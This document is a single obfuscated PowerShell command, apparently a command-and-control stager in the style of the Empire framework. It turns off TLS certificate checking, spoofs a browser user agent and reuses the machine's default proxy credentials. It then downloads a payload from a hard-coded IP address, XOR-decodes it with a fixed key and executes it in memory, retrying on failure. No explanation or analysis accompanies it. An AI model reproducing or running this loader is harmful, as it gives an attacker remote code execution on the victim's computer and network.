
$wc=NEW-ObJECT SySTEM.NET.WebClIeNt;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};$Wc.HeaDErS.ADD('User-Agent',$u);$wc.PROXY = [SysTEM.NeT.WebREQuesT]::DeFAulTWEBPrOxy;$wc.PROXY.CReDEntiAlS = [SYSTem.NeT.CRedEnTiAlCachE]::DEfAuLTNeTwOrkCredenTIALS;$K='879526880aa49cbc97d52c1088645422';$R=5;DO{TRy{$I=0;[cHAR[]]$B=([cHAR[]]($WC.DOWNLOADSTRiNg("https://52.39.227.108:443/index.asp")))|%{$_-bXOr$K[$I++%$K.LENGth]};IEX ($B-JoIN''); $R=0;}caTCH{SleEp 5;$R--}} WHile ($R -GT 0)

